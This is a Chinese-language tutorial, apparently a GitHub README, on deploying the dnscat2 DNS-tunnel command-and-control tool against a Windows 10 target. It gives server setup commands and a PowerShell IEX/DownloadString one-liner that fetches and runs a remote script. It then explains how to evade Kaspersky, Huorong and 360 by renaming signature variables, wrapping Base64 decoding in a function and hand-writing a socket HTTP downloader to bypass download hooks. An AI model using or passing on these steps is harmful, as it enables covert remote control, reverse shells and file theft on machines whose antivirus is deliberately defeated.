
### 作者: Mob2003

github地址
```url
https://github.com/Mob2003/HighAvailabilityApt1
```

### 1、简介

dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道，它的一大特色就是服务端会有一个命令行控制台，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell……

### 2、服务端安装

项目地址

```shell
https://github.com/iagox86/dnscat2
```

ubuntu 20.04安装说明

```shell
apt install ruby-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

启动服务端

```shell
ruby ./dnscat2.rb --no-cache --secret=12345678 www.baidu.com
```

### 3、powershell客户端使用

项目地址

```shell
https://github.com/lukebaggett/dnscat2-powershell
```

打开powershell

```shell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
```

连接服务器

```shell
start-Dnscat2 -PreSharedSecret 12345678 -DNSServer 服务器ip  -Domain www.baidu.com
```

如果一切正常，你就可以在服务器上命令行看到New window created
![image](https://user-images.githubusercontent.com/128351726/230552554-32ee3c72-d2ab-4d3e-9b0a-a1d742f681cf.png)


### 4、靶机测试

靶机win10，安装《卡巴斯基》，《火绒》，《360》软件
执行上面命令，这时候会发现有两个问题

- IEX Download后被杀
- 输入命令还没下载就被关掉窗口

### 5、过静态查杀

针对第一个问题，下载ps1源码，对其中变量名，函数调用进行修改与打乱即可，特征大概有两个

1. 源码第三行 $EncodedCompressedFile 

2. 源码第六行，连续调用IO.Compression.DeflateStream 与[IO.MemoryStream][Convert]::FromBase64String
   那么只需要对$EncodedCompressedFile 改个名字，另外再把Frombase64String提取出来做个函数，如下图

![image](https://user-images.githubusercontent.com/128351726/230552595-002a4fe4-9fd2-4bfd-a989-7e3d5102904a.png)


   现在使用各大软件扫描，静态查杀已经通过
   
  ![image](https://user-images.githubusercontent.com/128351726/230552704-80dd3275-5ccc-4a01-83bf-2b37b7cf9424.png)
   
   ### 6、绕过DownloadString限制
   
   高达300多kb的客户端，如果靶机没有文件上传的话，还是很麻烦的，所以要想办法从powershell下载执行。
   经测试360把Webclient的所有下载方法都进行了hook检测，只要有下载动作就强行下载。这里我的解决方案就是，使用socket编程，手撸一个http客户端
   注意，只支持http，不支持https
   
  ![image](https://user-images.githubusercontent.com/128351726/230552751-91b673ba-cd99-40ee-b901-4215676808c4.png)

   拷贝到powershell上执行，没有问题

![image](https://user-images.githubusercontent.com/128351726/230552874-28a2a6ca-b1e1-4825-811f-153f16a60e63.png)


